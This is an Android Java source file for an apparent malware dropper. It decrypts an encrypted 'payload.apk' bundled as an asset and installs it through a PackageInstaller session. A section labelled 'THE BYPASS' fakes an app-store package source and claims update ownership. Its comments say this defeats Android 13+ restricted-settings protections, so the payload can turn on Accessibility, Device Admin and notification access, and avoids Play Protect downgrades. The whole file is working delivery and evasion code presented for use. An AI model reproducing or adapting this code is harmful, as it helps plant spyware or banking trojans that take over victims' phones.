package com.installer.drop;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;

import net.lingala.zip4j.ZipFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    // Encrypted asset name (no extension) — AES-256 ZIP produced by build.sh.
    private static final String ASSET_NAME  = "module";
    // Inner filename inside the encrypted ZIP.
    private static final String INNER_NAME  = "payload.apk";
    private static final int    REQ_UNKNOWN_SOURCES = 1001;
    private static final String ACTION_INSTALL_DONE = "com.installer.drop.INSTALL_DONE";

    private TextView status;
    private InstallResultReceiver receiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        status = findViewById(R.id.status);
        Button btn = findViewById(R.id.btnInstall);
        btn.setOnClickListener(v -> startInstall());
    }

    private void startInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            status.setText("Allow install from this source, then return.");
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
            return;
        }
        new Thread(this::dropAndInstall).start();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_UNKNOWN_SOURCES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    && getPackageManager().canRequestPackageInstalls()) {
                new Thread(this::dropAndInstall).start();
            } else {
                runOnUiThread(() -> status.setText("Permission denied — cannot install."));
            }
        }
    }

    private void dropAndInstall() {
        try {
            runOnUiThread(() -> status.setText("Decrypting module …"));

            File workDir = new File(getCacheDir(), "drop");
            if (!workDir.exists()) workDir.mkdirs();
            // Clean any prior leftovers
            File leftover = new File(workDir, INNER_NAME);
            if (leftover.exists()) leftover.delete();

            File encZip = new File(workDir, "m.zip");
            try (InputStream in = getAssets().open(ASSET_NAME);
                 OutputStream out = new FileOutputStream(encZip)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            }

            ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
            zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
            encZip.delete();

            File apk = new File(workDir, INNER_NAME);
            if (!apk.exists() || apk.length() == 0) {
                throw new RuntimeException("Decrypted payload missing");
            }

            runOnUiThread(() -> status.setText("Installing …"));
            installViaSession(apk);
        } catch (Exception e) {
            runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
        }
    }

    private void installViaSession(File apk) throws Exception {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setInstallReason(PackageManager.INSTALL_REASON_USER);

        // ---------- THE BYPASS ----------
        // On Android 13+, apps installed from "side-loaded" sources are flagged
        // as restricted, which blocks the user from enabling Accessibility,
        // Notification Listener, Device Admin, etc. ("Restricted setting" /
        // "Can't modify system settings" dialog).
        //
        // Marking the session as PACKAGE_SOURCE_STORE tells PackageManager the
        // payload came from an app store — the same exemption Play Store gets —
        // so the installed app is NOT subject to the restricted-settings hardening
        // and Accessibility can be enabled normally from Settings.
        if (Build.VERSION.SDK_INT >= 33) {
            try {
                params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE);
            } catch (Throwable ignored) { }
        }
        // Android 14+: claim update ownership so future updates also bypass the
        // restriction and Play Protect doesn't downgrade the source.
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                params.getClass().getMethod("setRequestUpdateOwnership", boolean.class)
                        .invoke(params, true);
            } catch (Throwable ignored) { }
        }
        // --------------------------------

        int sessionId = pi.createSession(params);
        try (PackageInstaller.Session session = pi.openSession(sessionId)) {
            try (OutputStream sout = session.openWrite("base.apk", 0, apk.length());
                 InputStream  sin  = new FileInputStream(apk)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = sin.read(buf)) > 0) sout.write(buf, 0, n);
                session.fsync(sout);
            }

            // Register receiver for the install-status callback
            if (receiver != null) {
                try { unregisterReceiver(receiver); } catch (Exception ignored) {}
            }
            receiver = new InstallResultReceiver();
            IntentFilter filter = new IntentFilter(ACTION_INSTALL_DONE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }

            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                        ? PendingIntent.FLAG_MUTABLE : 0);
            Intent cb = new Intent(ACTION_INSTALL_DONE).setPackage(getPackageName());
            PendingIntent pending = PendingIntent.getBroadcast(
                    this, sessionId, cb, piFlags);

            session.commit(pending.getIntentSender());
        }
    }

    private class InstallResultReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            int s = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
            if (s == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (confirm != null) {
                    confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(confirm);
                }
            } else if (s == PackageInstaller.STATUS_SUCCESS) {
                runOnUiThread(() -> status.setText("Installed successfully."));
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            } else {
                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                runOnUiThread(() -> status.setText("Install failed: " + msg));
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            }
        }
    }
}
